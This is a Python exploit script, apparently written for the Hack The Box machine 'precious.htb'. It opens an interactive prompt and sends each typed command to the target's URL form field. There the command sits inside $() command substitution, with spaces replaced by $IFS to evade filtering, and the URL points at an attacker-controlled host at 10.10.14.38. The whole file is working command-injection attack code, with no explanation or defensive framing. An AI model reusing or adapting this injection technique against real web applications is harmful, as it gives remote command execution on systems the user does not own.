#!/usr/bin/python3

import requests
import urllib.parse

def req(command):
    burp0_url = "http://precious.htb:80/"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://precious.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://precious.htb/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"url": f"http://10.10.14.38:8001/a.html?a=$({command.replace(' ', '$IFS')})"}
    print(burp0_data)
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


import cmd

def loopFn(s):
	req(s)
	return s

class LoopFn(cmd.Cmd):
	prompt = "test > "
	def default(self, args):
		# print(loopFn(args))
		loopFn(args)
		print()

LoopFn().cmdloop()
